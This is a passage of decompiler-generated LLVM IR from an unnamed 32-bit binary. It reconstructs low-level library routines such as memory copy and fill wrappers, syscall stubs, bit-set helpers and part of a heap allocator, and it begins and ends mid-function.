  %v9_80527b1 = icmp ugt i8* %tmp3, %arg1
  %v1_80527b3 = icmp eq i1 %v9_80527b1, false
  br i1 %v1_80527b3, label %dec_label_pc_80527bb, label %dec_label_pc_80527b5

dec_label_pc_80527b5:                             ; preds = %dec_label_pc_80527a3
  %v7_80527b7 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_80527c7

dec_label_pc_80527bb:                             ; preds = %dec_label_pc_80527a3
  %v3_80527bb = add i32 %arg2, -1
  %v4_80527bb = add i32 %v3_80527bb, %arg3
  %v5_80527bb = inttoptr i32 %v4_80527bb to i8*
  %v3_80527bf = add i32 %v4_80527a5, -1
  %v4_80527bf = add i32 %v3_80527bf, %arg3
  %v5_80527bf = inttoptr i32 %v4_80527bf to i8*
  %v7_80527c4 = call i8* @_memcpy(i8* %v5_80527bf, i8* %v5_80527bb, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_80527c7

dec_label_pc_80527c7:                             ; preds = %dec_label_pc_80527b5, %dec_label_pc_80527bb
  %v2_80527c7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80527c7, i32* @esi, align 4
  ret i32 %v4_80527a5

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80527c7, { 1, 0 }
}

define i32 @function_80527ca(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80527ca:
  %v0_80527ca = load i32, i32* @edi, align 4
  %v4_80527d3 = ptrtoint i8* %arg1 to i32
  %v5_80527d7 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_80527ca, i32* @edi, align 4
  ret i32 %v4_80527d3

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_80527df(i32 %arg1) local_unnamed_addr {
dec_label_pc_80527df:
  %stack_var_-4 = alloca i32, align 4
  %v2_80527e2 = ptrtoint i32* %stack_var_-4 to i32
  %v2_80527eb = inttoptr i32 %arg1 to i8*
  %v3_80527eb = call i32 @function_80549e9(i8* %v2_80527eb, i32 %v2_80527e2)
  %v1_80527f6 = icmp eq i32 %v3_80527eb, 0
  br i1 %v1_80527f6, label %dec_label_pc_80527fe, label %dec_label_pc_80527fa

dec_label_pc_80527fa:                             ; preds = %dec_label_pc_80527df
  %v3_80527fa = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80527fe

dec_label_pc_80527fe:                             ; preds = %dec_label_pc_80527df, %dec_label_pc_80527fa
  %v0_80527fe = phi i32 [ -1, %dec_label_pc_80527df ], [ %v3_80527fa, %dec_label_pc_80527fa ]
  ret i32 %v0_80527fe

; uselistorder directives
  uselistorder label %dec_label_pc_80527fe, { 1, 0 }
}

define i32 @function_8052804(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052804:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805281f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052826 = call i32 @function_8054433(i32 5, i32 %v2_805281f)
  ret i32 %v2_8052826

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805282f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805282f:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805284a = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052851 = call i32 @function_8054433(i32 2, i32 %v2_805284a)
  ret i32 %v2_8052851

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805285a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805285a:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052875 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805287c = call i32 @function_8054433(i32 3, i32 %v2_8052875)
  ret i32 %v2_805287c

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8052885(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052885:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80528a0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80528a7 = call i32 @function_8054433(i32 6, i32 %v2_80528a0)
  ret i32 %v2_80528a7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80528b0() local_unnamed_addr {
dec_label_pc_80528b0:
  %stack_var_-20 = alloca i32, align 4
  %v2_80528db = ptrtoint i32* %stack_var_-20 to i32
  %v2_80528e2 = call i32 @function_8054433(i32 15, i32 %v2_80528db)
  ret i32 %v2_80528e2
}

define i32 @function_80528eb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80528eb:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_80528fe = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052905 = call i32 @function_8054433(i32 4, i32 %v2_80528fe)
  ret i32 %v2_8052905

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_805290e() local_unnamed_addr {
dec_label_pc_805290e:
  %stack_var_-16 = alloca i32, align 4
  %v2_8052931 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8052938 = call i32 @function_8054433(i32 10, i32 %v2_8052931)
  ret i32 %v2_8052938
}

define i32 @function_8052941() local_unnamed_addr {
dec_label_pc_8052941:
  %stack_var_-24 = alloca i32, align 4
  %v2_8052974 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805297b = call i32 @function_8054433(i32 12, i32 %v2_8052974)
  ret i32 %v2_805297b
}

define i32 @function_8052984() local_unnamed_addr {
dec_label_pc_8052984:
  %stack_var_-16 = alloca i32, align 4
  %v2_80529a7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80529ae = call i32 @function_8054433(i32 9, i32 %v2_80529a7)
  ret i32 %v2_80529ae
}

define i32 @function_80529b7() local_unnamed_addr {
dec_label_pc_80529b7:
  %stack_var_-24 = alloca i32, align 4
  %v2_80529ea = ptrtoint i32* %stack_var_-24 to i32
  %v2_80529f1 = call i32 @function_8054433(i32 11, i32 %v2_80529ea)
  ret i32 %v2_80529f1
}

define i32 @function_80529fa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80529fa:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8052a25 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052a2c = call i32 @function_8054433(i32 14, i32 %v2_8052a25)
  ret i32 %v2_8052a2c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8052a35(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052a35:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052a50 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052a57 = call i32 @function_8054433(i32 1, i32 %v2_8052a50)
  ret i32 %v2_8052a57

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8054433, { 5, 4, 9, 3, 8, 2, 7, 1, 10, 0, 6, 11 }
}

define i32 @function_8052a60(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a60:
  %v0_8052a63 = call i32 @function_8052295()
  %v0_8052a68 = load i32, i32* @edx, align 4
  %v4_8052a6f = call i32 @function_8052320(i32 %v0_8052a63, i32 %arg1, i32 %v0_8052a68, i32 %v0_8052a68)
  ret i32 %v4_8052a6f

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_8052320, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_8052295, { 0, 2, 1 }
}

define i32 @function_8052a78(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a78:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052a90, label %dec_label_pc_8052a83

dec_label_pc_8052a83:                             ; preds = %dec_label_pc_8052a78
  %v1_8052a83 = add i32 %arg1, -64
  %v3_8052a83 = sub i32 63, %arg1
  %v4_8052a83 = and i32 %v3_8052a83, %arg1
  %v5_8052a83 = icmp slt i32 %v4_8052a83, 0
  %v6_8052a83 = icmp eq i32 %v1_8052a83, 0
  %v7_8052a83 = icmp slt i32 %v1_8052a83, 0
  %v3_8052a86 = icmp eq i1 %v7_8052a83, %v5_8052a83
  %v4_8052a86 = icmp eq i1 %v6_8052a83, false
  %v5_8052a86 = and i1 %v4_8052a86, %v3_8052a86
  br i1 %v5_8052a86, label %dec_label_pc_8052a90, label %dec_label_pc_8052a88

dec_label_pc_8052a88:                             ; preds = %dec_label_pc_8052a83
  %v4_8052a8b = call i32 @function_8052b8e(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8052a90

dec_label_pc_8052a90:                             ; preds = %dec_label_pc_8052a83, %dec_label_pc_8052a78, %dec_label_pc_8052a88
  %v1_8052a90 = call i32 @function_8052779(i32 ptrtoint (i32* @0 to i32))
  %v1_8052a95 = inttoptr i32 %v1_8052a90 to i32*
  store i32 22, i32* %v1_8052a95, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8052a83, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052a90, { 2, 0, 1 }
}

define i32 @function_8052aa2(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052aa2:
  %v3_8052ab0 = inttoptr i32 %arg1 to i8*
  %v4_8052ab0 = call i32 @function_80527ca(i8* %v3_8052ab0, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8052abb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052abb:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8052abb = load i32, i32* @ebx, align 4
  %v15_8052abc = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052ad0 = icmp eq i32 %arg2, -1
  br i1 %v10_8052ad0, label %dec_label_pc_8052ade, label %dec_label_pc_8052ad5

dec_label_pc_8052ad5:                             ; preds = %dec_label_pc_8052abb
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_8052ade, label %dec_label_pc_8052ad9

dec_label_pc_8052ad9:                             ; preds = %dec_label_pc_8052ad5
  %v7_8052adc = icmp sgt i32 %arg1, 64
  br i1 %v7_8052adc, label %dec_label_pc_8052ade, label %dec_label_pc_8052af9.lr.ph

dec_label_pc_8052ade:                             ; preds = %dec_label_pc_8052ad9, %dec_label_pc_8052ad5, %dec_label_pc_8052abb
  %v1_8052ade = call i32 @function_8052779(i32 %v0_8052abb)
  store i32 %v1_8052ade, i32* %eax.global-to-local, align 4
  %v1_8052ae3 = inttoptr i32 %v1_8052ade to i32*
  store i32 22, i32* %v1_8052ae3, align 4
  br label %dec_label_pc_8052b5f

dec_label_pc_8052af9.lr.ph:                       ; preds = %dec_label_pc_8052ad9
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8052af927 = add i32 %v15_8052abc, 284
  %v5_8052af928 = inttoptr i32 %v4_8052af927 to i32*
  store i32 0, i32* %v5_8052af928, align 4
  %v0_8052b0429 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b0430 = add i32 %v0_8052b0429, -1
  %v9_8052b0431 = icmp slt i32 %v1_8052b0430, 0
  store i32 %v1_8052b0430, i32* %eax.global-to-local, align 4
  %v1_8052b0532 = icmp eq i1 %v9_8052b0431, false
  br i1 %v1_8052b0532, label %dec_label_pc_8052af9.dec_label_pc_8052af9_crit_edge, label %dec_label_pc_8052b07

dec_label_pc_8052af9.dec_label_pc_8052af9_crit_edge: ; preds = %dec_label_pc_8052af9.lr.ph, %dec_label_pc_8052af9.dec_label_pc_8052af9_crit_edge
  %v1_8052b0433 = phi i32 [ %v1_8052b04, %dec_label_pc_8052af9.dec_label_pc_8052af9_crit_edge ], [ %v1_8052b0430, %dec_label_pc_8052af9.lr.ph ]
  %v0_8052af9.pre = load i32, i32* @esp, align 4
  %v2_8052af9 = mul i32 %v1_8052b0433, 4
  %v3_8052af9 = add i32 %v0_8052af9.pre, 160
  %v4_8052af9 = add i32 %v3_8052af9, %v2_8052af9
  %v5_8052af9 = inttoptr i32 %v4_8052af9 to i32*
  store i32 0, i32* %v5_8052af9, align 4
  %v0_8052b04 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b04 = add i32 %v0_8052b04, -1
  %v9_8052b04 = icmp slt i32 %v1_8052b04, 0
  store i32 %v1_8052b04, i32* %eax.global-to-local, align 4
  %v1_8052b05 = icmp eq i1 %v9_8052b04, false
  br i1 %v1_8052b05, label %dec_label_pc_8052af9.dec_label_pc_8052af9_crit_edge, label %dec_label_pc_8052b07

dec_label_pc_8052b07:                             ; preds = %dec_label_pc_8052af9.dec_label_pc_8052af9_crit_edge, %dec_label_pc_8052af9.lr.ph
  %v0_8052b07 = load i32, i32* @edx, align 4
  %v2_8052b0a = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8052b0a, i32* %eax.global-to-local, align 4
  %v4_8052b12 = call i32 @function_8052b8e(i32 %v2_8052b0a, i32 %arg1, i32 %v0_8052b07, i32 %v0_8052b07)
  store i32 %v4_8052b12, i32* %eax.global-to-local, align 4
  %v2_8052b1a = icmp slt i32 %v4_8052b12, 0
  br i1 %v2_8052b1a, label %dec_label_pc_8052b5f, label %dec_label_pc_8052b1e

dec_label_pc_8052b1e:                             ; preds = %dec_label_pc_8052b07
  %v4_8052b26 = call i32 @function_8052b6a(i32 ptrtoint (i32* @global_var_8056ba0.204 to i32), i32 %arg1, i32 %v4_8052b12, i32 %v4_8052b12)
  %v2_8052b3f = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052b44 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052b44, i32* %eax.global-to-local, align 4
  %v4_8052b4d = call i32 @function_805433f(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8052b3f)
  store i32 %v4_8052b4d, i32* %eax.global-to-local, align 4
  %v2_8052b55 = icmp slt i32 %v4_8052b4d, 0
  br i1 %v2_8052b55, label %dec_label_pc_8052b5f, label %dec_label_pc_8052b59

dec_label_pc_8052b59:                             ; preds = %dec_label_pc_8052b1e
  %v3_8052b59 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8052b62

dec_label_pc_8052b5f:                             ; preds = %dec_label_pc_8052b1e, %dec_label_pc_8052b07, %dec_label_pc_8052ade
  br label %dec_label_pc_8052b62

dec_label_pc_8052b62:                             ; preds = %dec_label_pc_8052b59, %dec_label_pc_8052b5f
  %storemerge = phi i32 [ -1, %dec_label_pc_8052b5f ], [ %v3_8052b59, %dec_label_pc_8052b59 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052b04, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 10, 11, 8, 9, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 1, 2, 3, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_8052b62, { 1, 0 }
  uselistorder label %dec_label_pc_8052af9.dec_label_pc_8052af9_crit_edge, { 1, 0 }
}

define i32 @function_8052b6a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b6a:
  %v1_8052b78 = add i32 %arg2, -1
  %v1_8052b7b = urem i32 %v1_8052b78, 32
  %v2_8052b7b = icmp eq i32 %v1_8052b7b, 0
  %v2_8052b7e = udiv i32 %v1_8052b78, 32
  br i1 %v2_8052b7b, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052b6a
  %v5_8052b81 = shl i32 1, %v1_8052b7b
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052b6a, %bb
  %v6_8052b83 = phi i32 [ 1, %dec_label_pc_8052b6a ], [ %v5_8052b81, %bb ]
  %v2_8052b83 = mul nuw nsw i32 %v2_8052b7e, 4
  %v3_8052b83 = add i32 %v2_8052b83, %arg1
  %v4_8052b83 = inttoptr i32 %v3_8052b83 to i32*
  %v5_8052b83 = load i32, i32* %v4_8052b83, align 4
  %v7_8052b83 = and i32 %v5_8052b83, %v6_8052b83
  %v8_8052b83 = icmp eq i32 %v7_8052b83, 0
  %v1_8052b87 = icmp eq i1 %v8_8052b83, false
  %v2_8052b87 = zext i1 %v1_8052b87 to i32
  ret i32 %v2_8052b87

; uselistorder directives
  uselistorder i32 %v1_8052b7b, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052b8e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b8e:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b8e = load i32, i32* @ebx, align 4
  store i32 %v0_8052b8e, i32* %stack_var_-4, align 4
  %v1_8052b9c = add i32 %arg2, -1
  %v1_8052b9f = urem i32 %v1_8052b9c, 32
  %v2_8052b9f = icmp eq i32 %v1_8052b9f, 0
  store i32 %v1_8052b9f, i32* @ecx, align 4
  %v2_8052ba2 = udiv i32 %v1_8052b9c, 32
  store i32 %v2_8052ba2, i32* @edx, align 4
  br i1 %v2_8052b9f, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052b8e
  %v5_8052ba5 = shl i32 1, %v1_8052b9f
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052b8e, %bb
  %v6_8052ba7 = phi i32 [ 1, %dec_label_pc_8052b8e ], [ %v5_8052ba5, %bb ]
  %v2_8052ba7 = mul nuw nsw i32 %v2_8052ba2, 4
  %v3_8052ba7 = add i32 %v2_8052ba7, %arg1
  %v4_8052ba7 = inttoptr i32 %v3_8052ba7 to i32*
  %v5_8052ba7 = load i32, i32* %v4_8052ba7, align 4
  %v7_8052ba7 = or i32 %v5_8052ba7, %v6_8052ba7
  store i32 %v7_8052ba7, i32* %v4_8052ba7, align 4
  %v2_8052bac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052bac, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8052ba2, { 1, 0 }
  uselistorder i32 %v1_8052b9f, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052bae() local_unnamed_addr {
dec_label_pc_8052bae:
  %v0_8052bae = load i32, i32* @eax, align 4
  %v6_8052bc1 = icmp ugt i32 %v0_8052bae, 16777215
  br i1 %v6_8052bc1, label %dec_label_pc_8052bd2, label %dec_label_pc_8052bc3

dec_label_pc_8052bc3:                             ; preds = %dec_label_pc_8052bae
  %tmp = icmp ult i32 %v0_8052bae, 256
  %v2_8052bb1 = udiv i32 %v0_8052bae, 256
  %v2_8052bc3 = call i32 @llvm.ctlz.i32(i32 %v2_8052bb1, i1 true)
  %v3_8052bc3 = xor i32 %v2_8052bc3, 31
  %v5_8052bc3 = select i1 %tmp, i32 95, i32 %v3_8052bc3
  %v1_8052bc6 = add nuw nsw i32 %v5_8052bc3, 6
  %v2_8052bc9 = urem i32 %v1_8052bc6, 32
  %v4_8052bc9 = icmp eq i32 %v2_8052bc9, 0
  br i1 %v4_8052bc9, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052bc3
  %v5_8052bc9 = lshr i32 %v0_8052bae, %v2_8052bc9
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052bc3, %bb
  %v0_8052bcb = phi i32 [ %v0_8052bae, %dec_label_pc_8052bc3 ], [ %v5_8052bc9, %bb ]
  %v1_8052bcb = urem i32 %v0_8052bcb, 4
  %v2_8052bce = mul nuw nsw i32 %v5_8052bc3, 4
  %v3_8052bce = or i32 %v1_8052bcb, 32
  %v4_8052bce = add nuw nsw i32 %v3_8052bce, %v2_8052bce
  br label %dec_label_pc_8052bd2

dec_label_pc_8052bd2:                             ; preds = %dec_label_pc_8052bae, %bb4
  %v0_8052bd3 = phi i32 [ 95, %dec_label_pc_8052bae ], [ %v4_8052bce, %bb4 ]
  ret i32 %v0_8052bd3

; uselistorder directives
  uselistorder i32 %v2_8052bc9, { 1, 0 }
  uselistorder i32 %v0_8052bae, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052bd2, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8052bd4(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052bd4:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052bd4 = load i32, i32* @ebp, align 4
  %v0_8052bd5 = load i32, i32* @edi, align 4
  %v0_8052bd6 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052be9 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052be9, i32* @eax, align 4
  store i32 %v2_8052be9, i32* %stack_var_-92, align 4
  %v2_8052bee = call i32 @function_8054100(i32 %v2_8052be9, i32 134562045)
  store i32 %v2_8052bee, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056880.205 to i32), i32* %stack_var_-92, align 4
  %v1_8052bfa = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_8056880.205 to i32))
  store i32 %v1_8052bfa, i32* %eax.global-to-local, align 4
  %v0_8052c02 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8052c02, -32
  br i1 %tmp124, label %dec_label_pc_8052c19, label %dec_label_pc_8052c07

dec_label_pc_8052c07:                             ; preds = %dec_label_pc_8052bd4
  %v0_8052c07 = load i32, i32* %stack_var_-92, align 4
  %v1_8052c07 = call i32 @function_8052779(i32 %v0_8052c07)
  store i32 %v1_8052c07, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052c0e = inttoptr i32 %v1_8052c07 to i32*
  store i32 12, i32* %v1_8052c0e, align 4
  br label %dec_label_pc_805333e

dec_label_pc_8052c19:                             ; preds = %dec_label_pc_8052bd4
  %v1_8052c19 = add i32 %v0_8052c02, 11
  %tmp125 = icmp ult i32 %v1_8052c19, 16
  br i1 %tmp125, label %dec_label_pc_8052c30, label %dec_label_pc_8052c29

dec_label_pc_8052c29:                             ; preds = %dec_label_pc_8052c19
  %v1_8052c29 = and i32 %v1_8052c19, -8
  br label %dec_label_pc_8052c30

dec_label_pc_8052c30:                             ; preds = %dec_label_pc_8052c19, %dec_label_pc_8052c29
  %storemerge135 = phi i32 [ %v1_8052c29, %dec_label_pc_8052c29 ], [ %v1_8052c19, %dec_label_pc_8052c19 ]
  %v1_8052fc8 = phi i32 [ %v1_8052c29, %dec_label_pc_8052c29 ], [ 16, %dec_label_pc_8052c19 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_8052c30 = load i8, i8* @global_var_8056c20.206, align 1
  %v1_8052c30 = sext i8 %v0_8052c30 to i32
  store i32 %v1_8052c30, i32* @ebx, align 4
  %v3_8052c36 = urem i8 %v0_8052c30, 2
  %v4_8052c36 = icmp eq i8 %v3_8052c36, 0
  %v1_8052c39 = icmp eq i1 %v4_8052c36, false
  br i1 %v1_8052c39, label %dec_label_pc_8052c58, label %dec_label_pc_8052c3b

dec_label_pc_8052c3b:                             ; preds = %dec_label_pc_8052c30
  %v2_8052c3b = icmp eq i8 %v0_8052c30, 0
  %v1_8052c3d = icmp eq i1 %v2_8052c3b, false
  br i1 %v1_8052c3d, label %dec_label_pc_8052f33, label %dec_label_pc_8052c43

dec_label_pc_8052c43:                             ; preds = %dec_label_pc_8052c3b
  store i32 ptrtoint (i8* @global_var_8056c20.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052c4b = call i32 @function_80537f1(i32* bitcast (i8* @global_var_8056c20.206 to i32*))
  store i32 %v2_8052c4b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f33

dec_label_pc_8052c58:                             ; preds = %dec_label_pc_8052c30
  %v11_8052c58 = trunc i32 %v1_8052fc8 to i8
  %v8_8052c5c = icmp ugt i8 %v11_8052c58, %v0_8052c30
  br i1 %v8_8052c5c, label %dec_label_pc_8052c79, label %dec_label_pc_8052c5e

dec_label_pc_8052c5e:                             ; preds = %dec_label_pc_8052c58
  %v2_8052c62 = udiv i32 %v1_8052fc8, 2
  store i32 %v2_8052c62, i32* %eax.global-to-local, align 4
  %v1_8052c64 = add i32 %v2_8052c62, ptrtoint (i8* @global_var_8056c20.206 to i32)
  store i32 %v1_8052c64, i32* %ecx.global-to-local, align 4
  %v1_8052c6a = add i32 %v2_8052c62, add (i32 ptrtoint (i8* @global_var_8056c20.206 to i32), i32 -4)
  %v2_8052c6a = inttoptr i32 %v1_8052c6a to i32*
  %v3_8052c6a = load i32, i32* %v2_8052c6a, align 4
  store i32 %v3_8052c6a, i32* @edx, align 4
  %v1_8052c6d = icmp eq i32 %v3_8052c6a, 0
  br i1 %v1_8052c6d, label %dec_label_pc_8052c79, label %dec_label_pc_8052c71

dec_label_pc_8052c71:                             ; preds = %dec_label_pc_8052c5e
  %v1_8052c71 = add i32 %v3_8052c6a, 8
  %v2_8052c71 = inttoptr i32 %v1_8052c71 to i32*
  %v3_8052c71 = load i32, i32* %v2_8052c71, align 4
  store i32 %v3_8052c71, i32* %eax.global-to-local, align 4
  store i32 %v3_8052c71, i32* %v2_8052c6a, align 4
  br label %dec_label_pc_8052cb2

dec_label_pc_8052c79:                             ; preds = %dec_label_pc_8052c5e, %dec_label_pc_8052c58
  %v8_8052c79 = icmp ult i32 %v1_8052fc8, 255
  %v6_8052c81 = icmp ugt i32 %v1_8052fc8, 255
  store i32 %v1_8052fc8, i32* @eax, align 4
  br i1 %v6_8052c81, label %dec_label_pc_8052cba, label %dec_label_pc_8052c83

dec_label_pc_8052c83:                             ; preds = %dec_label_pc_8052c79
  %v2_8052c87 = udiv i32 %v1_8052fc8, 8
  store i32 %v2_8052c87, i32* %eax.global-to-local, align 4
  %v1_8052c8e = mul nuw i32 %v2_8052c87, 8
  %v2_8052c8e = add i32 %v1_8052c8e, ptrtoint (i32* @global_var_8056c4c.207 to i32)
  store i32 %v2_8052c8e, i32* %ecx.global-to-local, align 4
  %v1_8052c95 = add i32 %v1_8052c8e, add (i32 ptrtoint (i32* @global_var_8056c4c.207 to i32), i32 12)
  %v2_8052c95 = inttoptr i32 %v1_8052c95 to i32*
  %v3_8052c95 = load i32, i32* %v2_8052c95, align 4
  store i32 %v3_8052c95, i32* @edx, align 4
  %v12_8052c98 = icmp eq i32 %v3_8052c95, %v2_8052c8e
  br i1 %v12_8052c98, label %dec_label_pc_8052db6.preheader, label %dec_label_pc_8052ca0

dec_label_pc_8052ca0:                             ; preds = %dec_label_pc_8052c83
  store i32 %v1_8052fc8, i32* %ebx.global-to-local, align 4
  %v1_8052ca4 = add i32 %v3_8052c95, 12
  %v2_8052ca4 = inttoptr i32 %v1_8052ca4 to i32*
  %v3_8052ca4 = load i32, i32* %v2_8052ca4, align 4
  store i32 %v3_8052ca4, i32* %eax.global-to-local, align 4
  store i32 %v3_8052ca4, i32* %v2_8052c95, align 4
  %v0_8052caa = load i32, i32* @edx, align 4
  %v1_8052caa = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052caa = add i32 %v0_8052caa, 4
  %v3_8052caa = add i32 %v2_8052caa, %v1_8052caa
  %v4_8052caa = inttoptr i32 %v3_8052caa to i32*
  %v5_8052caa = load i32, i32* %v4_8052caa, align 4
  %v6_8052caa = or i32 %v5_8052caa, 1
  store i32 %v6_8052caa, i32* %v4_8052caa, align 4
  %v0_8052caf = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052caf = load i32, i32* %eax.global-to-local, align 4
  %v2_8052caf = add i32 %v1_8052caf, 8
  %v3_8052caf = inttoptr i32 %v2_8052caf to i32*
  store i32 %v0_8052caf, i32* %v3_8052caf, align 4
  br label %dec_label_pc_8052cb2

dec_label_pc_8052cb2:                             ; preds = %dec_label_pc_805304f, %dec_label_pc_8053061, %dec_label_pc_8052c71, %dec_label_pc_8052ca0
  %v0_8052cb2 = load i32, i32* @edx, align 4
  %v1_8052cb2 = add i32 %v0_8052cb2, 8
  store i32 %v1_8052cb2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805332d

dec_label_pc_8052cba:                             ; preds = %dec_label_pc_8052c79
